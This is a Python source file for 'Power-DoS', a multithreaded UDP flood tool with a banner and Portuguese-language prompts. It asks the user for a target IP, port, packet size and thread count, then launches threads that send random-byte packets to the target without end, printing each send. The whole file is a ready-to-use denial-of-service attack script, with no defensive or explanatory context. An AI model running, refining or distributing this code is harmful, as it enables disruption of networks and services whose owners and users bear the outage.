import threading
import socket
import random
import time
import sys

init = False

#Power-DoS banner
def banner():
	print("""\033[1;31m
	 ▄▀▀▄▀▀▀▄  ▄▀▀▀▀▄   ▄▀▀▄    ▄▀▀▄  ▄▀▀█▄▄▄▄  ▄▀▀▄▀▀▀▄      ▄▀▀█▄▄   ▄▀▀▀▀▄   ▄▀▀▀▀▄ 
	█   █   █ █      █ █   █    ▐  █ ▐  ▄▀   ▐ █   █   █     █ ▄▀   █ █      █ █ █   ▐ 
	▐  █▀▀▀▀  █      █ ▐  █        █   █▄▄▄▄▄  ▐  █▀▀█▀      ▐ █    █ █      █    ▀▄   
	   █      ▀▄    ▄▀   █   ▄    █    █    ▌   ▄▀    █        █    █ ▀▄    ▄▀ ▀▄   █  
	 ▄▀         ▀▀▀▀      ▀▄▀ ▀▄ ▄▀   ▄▀▄▄▄▄   █     █        ▄▀▄▄▄▄▀   ▀▀▀▀    █▀▀▀   
	█                           ▀     █    ▐   ▐     ▐       █     ▐            ▐      
	▐                                 ▐                      ▐                        
		\033[4;33mVersion 1.0
        \033[4;33mCoded by Leonardo Sasaki\x99
	""")

def DoS(ip, port, size, index):
	while init == False:
		time.sleep(1)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	while True:
		sock.sendto(random._urandom(size), (ip, port))
		print(f"\033[1;32m[THREAD {index}] \xBB {size} bytes enviados para {ip}")

banner()
#verifica a versão do python
print("\033[1;32m\xBB Verificando a versão...")
if sys.version_info < (3, 0):
    print("\033[1;31mERRO!! Por favor, utilize python3")
    sys.exit(1)

target_ip = input("\033[1;32mDigite o ip alvo: ")
target_port = int(input("\033[1;32mDigite a porta alvo: "))
target_size = int(input("\033[1;32mDigite o tamanho dos pacotes: "))
thread_count = int(input("\033[1;32mDigite o número de threads a utilizar: "))

for i in range(thread_count):
	try:
		thread = threading.Thread(target=DoS, args=(target_ip, target_port, target_size, i,))
		thread.start()
	except:
		print(f"\033[1;31mErro ao inicializar a thread número {i} (Você escolheu muitas threads?)")

init = True
